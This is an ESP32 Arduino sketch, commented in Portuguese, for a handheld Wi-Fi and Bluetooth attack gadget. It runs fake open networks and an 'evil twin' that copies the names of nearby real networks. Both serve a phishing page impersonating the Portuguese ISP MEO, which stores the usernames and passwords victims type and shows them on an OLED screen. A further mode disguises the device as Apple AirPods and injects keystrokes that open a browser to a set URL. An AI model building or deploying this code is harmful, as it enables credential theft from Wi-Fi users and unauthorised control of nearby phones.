#include <WiFi.h>
#include <AsyncTCP.h>
#include <ESPAsyncWebServer.h>
#include <DNSServer.h>
#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <BleKeyboard.h>

#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_RESET -1
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);

#define BTN_MODE 18
#define BTN_ACTION 19

#define KEY_SEARCH 0x44

AsyncWebServer server(80);
DNSServer dnsServer;

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);
IPAddress netMsk(255, 255, 255, 0);

const char* spoofSSIDs[] = {"FREE_WIFI", "HACKED_NET", "LOL_NET", "OPEN_WIFI"};
int currentSSID = 0, mode = 0, visitCount = 0;
unsigned long lastDebounce = 0;
const unsigned long debounceDelay = 300;

String capturedCreds[10];
int credsCount = 0;

String targetSSIDs[10];
int numTargets = 0, selectedTarget = 0;

const char* ByteCat1[] = {"  /\\_/\\ ", " ( o.o )", "  > ^ < "};
const char* ByteCat2[] = {"  /\\_/\\ ", " ( -.- )", "  > ^ < "};

BleKeyboard bleKeyboard("Airpods Pro", "Apple Inc.", 100);

const char* html_page = R"rawliteral(
<!DOCTYPE html><html lang="pt">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>MEO WiFi Login</title>
<style>body{background:#f4f4f4;font-family:Arial;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
.container{background:white;padding:20px;box-shadow:0 0 10px gray;border-radius:8px}
h2{color:#003366}input,button{width:100%;padding:10px;margin:10px 0}button{background:#00a1e0;color:white;border:none}</style>
</head><body><div class="container"><h2>Inicie sessão na rede WiFi MEO</h2>
<form method="POST" action="/login">
<input name="user" placeholder="Nome de utilizador" required>
<input name="pass" type="password" placeholder="Palavra‑passe" required>
<button type="submit">Entrar</button>
</form><div class="note">Ao iniciar sessão, aceita os Termos e Condições.</div></div></body></html>
)rawliteral";

void showMascot(bool blink) {
  display.setTextSize(1);
  display.setCursor(0, 0);
  display.println(blink ? ByteCat1[0] : ByteCat2[0]);
  display.setCursor(0, 8);
  display.println(blink ? ByteCat1[1] : ByteCat2[1]);
  display.setCursor(0, 16);
  display.println(blink ? ByteCat1[2] : ByteCat2[2]);
}

void updateDisplay(String title, String info, int visitors, bool blink) {
  display.clearDisplay();
  showMascot(blink);
  display.setTextSize(1);
  display.setCursor(0, 32);
  display.println("Modo: " + title);
  display.println("SSID: " + info);
  display.println("Visitantes: " + String(visitors));
  display.display();
}

void showCredsDisplay() {
  display.clearDisplay();
  showMascot(true);
  display.setTextSize(1);
  display.setCursor(0, 32);
  display.println("Credenciais:");
  if (credsCount > 0) {
    display.println(capturedCreds[credsCount - 1]);
    if (credsCount > 1)
      display.println(capturedCreds[credsCount - 2]);
  } else {
    display.println("Nenhuma.");
  }
  display.display();
}

void resetSystem() {
  WiFi.softAPdisconnect(true);
  dnsServer.stop();
  server.end();
  visitCount = 0;
}

void setupCaptive(const char* ssid) {
  WiFi.softAPConfig(apIP, apIP, netMsk);
  WiFi.softAP(ssid, "", 6);
  delay(200);
  dnsServer.start(DNS_PORT, "*", apIP);
  server.end();

  server.on("/", HTTP_GET, [](AsyncWebServerRequest *r) {
    visitCount++;
    r->send(200, "text/html", html_page);
  });

  server.on("/login", HTTP_POST, [](AsyncWebServerRequest *r) {
    String u = r->arg("user"), p = r->arg("pass");
    if (credsCount < 10)
      capturedCreds[credsCount++] = "U:" + u + " P:" + p;
    r->redirect("/");
  });

  server.onNotFound([](AsyncWebServerRequest *r) {
    r->redirect("/");
  });

  server.begin();
}

void scanNetworks() {
  numTargets = WiFi.scanNetworks();
  for (int i = 0; i < numTargets && i < 10; i++) {
    targetSSIDs[i] = WiFi.SSID(i);
  }
  if (numTargets == 0) {
    targetSSIDs[0] = "NoNetworks";
    numTargets = 1;
  }
}

// --------- Bluetooth: Ativar e Desativar ---------
void startBLE() {
  bleKeyboard.begin();
}

void stopBLE() {
  // BLE não tem .end() direto, então só desliga o WiFi para evitar conflito
  WiFi.mode(WIFI_OFF);
}

// --------- PAYLOAD HID PARA ANDROID ---------
void startHIDPayload() {
  WiFi.mode(WIFI_OFF);
  delay(500);

  if (!bleKeyboard.isConnected()) {
    Serial.println("Aguardando conexão BLE...");
    return;
  }

  Serial.println("Enviando payload: abrir navegador e acessar link...");
  delay(2000);

  // Comando para abrir navegador padrão no Android
  bleKeyboard.write(KEY_MEDIA_WWW_HOME);
  delay(1500); // aguarda o browser abrir

  // Digitar a URL lentamente
  String url = "https://github.com/pedrolucas7i";
  for (char c : url) {
    bleKeyboard.print(c);
    delay(50);
  }

  // Pressionar ENTER para navegar
  bleKeyboard.write(KEY_RETURN);
  Serial.println("Payload enviado com sucesso.");
}

void setup() {
  Serial.begin(115200);
  pinMode(BTN_MODE, INPUT_PULLDOWN);
  pinMode(BTN_ACTION, INPUT_PULLDOWN);

  if (!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
    Serial.println("Falha ao iniciar display!");
    while (true);
  }

  display.clearDisplay();
  display.setTextColor(WHITE);
  display.setTextSize(1);
  updateDisplay("Standby", "-", 0, true);

  WiFi.mode(WIFI_OFF);
  WiFi.softAPdisconnect(true);
}

void loop() {
  bool blink = millis() % 1000 < 500;
  dnsServer.processNextRequest();

  if (millis() - lastDebounce > debounceDelay) {
    if (digitalRead(BTN_MODE) == HIGH) {
      lastDebounce = millis();
      mode = (mode + 1) % 6;
      resetSystem();
      stopBLE();

      switch (mode) {
        case 1:
          currentSSID = (currentSSID + 1) % 4;
          setupCaptive(spoofSSIDs[currentSSID]);
          updateDisplay("SSID Spoof", spoofSSIDs[currentSSID], visitCount, blink);
          break;
        case 2:
          setupCaptive("LOGIN_PORTAL");
          updateDisplay("Captive Portal", "LOGIN_PORTAL", visitCount, blink);
          break;
        case 3:
          WiFi.mode(WIFI_STA);
          WiFi.disconnect();
          delay(500);
          scanNetworks();
          selectedTarget = 0;
          setupCaptive(targetSSIDs[selectedTarget].c_str());
          updateDisplay("Evil Twin", targetSSIDs[selectedTarget], visitCount, blink);
          break;
        case 4:
          showCredsDisplay();
          break;
        case 5:
          startBLE();
          updateDisplay("Bluetooth HID", "Esperando", 0, blink);
          break;
        default:
          updateDisplay("Standby", "-", visitCount, blink);
      }
    }

    if (digitalRead(BTN_ACTION) == HIGH) {
      lastDebounce = millis();
      if (mode == 3) {
        selectedTarget = (selectedTarget + 1) % numTargets;
        resetSystem();
        setupCaptive(targetSSIDs[selectedTarget].c_str());
        updateDisplay("Evil Twin", targetSSIDs[selectedTarget], visitCount, blink);
      } else if (mode == 5) {
        startHIDPayload();
        updateDisplay("Payload Enviado", "https://github.com/pedrolucas7i", 0, blink);
      } else {
        resetSystem();
        updateDisplay("Resetado", "-", 0, blink);
      }
    }
  }

  if (mode == 2 || mode == 3) {
    updateDisplay(mode == 2 ? "Captive Portal" : "Evil Twin",
                  mode == 2 ? "LOGIN_PORTAL" : targetSSIDs[selectedTarget],
                  visitCount, blink);
  }
}
